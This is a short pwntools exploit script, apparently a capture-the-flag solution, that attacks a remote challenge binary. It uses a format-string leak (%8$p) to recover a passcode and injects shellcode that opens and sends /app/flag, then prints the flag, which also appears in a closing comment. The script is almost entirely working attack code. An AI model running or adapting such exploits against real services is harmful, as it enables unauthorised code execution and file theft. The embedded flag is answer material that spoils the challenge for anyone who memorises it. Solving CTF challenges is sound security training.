from pwn import *

context.binary = exe = ELF('chal')

io = remote('pwn.1337.sb', 13386)

io.sendlineafter(b': ', str(0x700000100).encode())
io.sendlineafter(b': ', b'%8$p%10c')

shellcode = shellcraft.openat(0, "/app/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 'rax', 0, 50)
payload = asm(shellcode)
io.sendlineafter(b': ', payload)

io.recvuntil(b'0x')
passcode = int(io.recvuntil(b' '), 16)
io.sendlineafter(b': ', b'y')
io.sendlineafter(b': ', str(passcode).encode())

print(io.recvuntil(b"}"))

exit(0)

# cr3{b3t4_5t1LL_1n_d3v3l0pm3nt}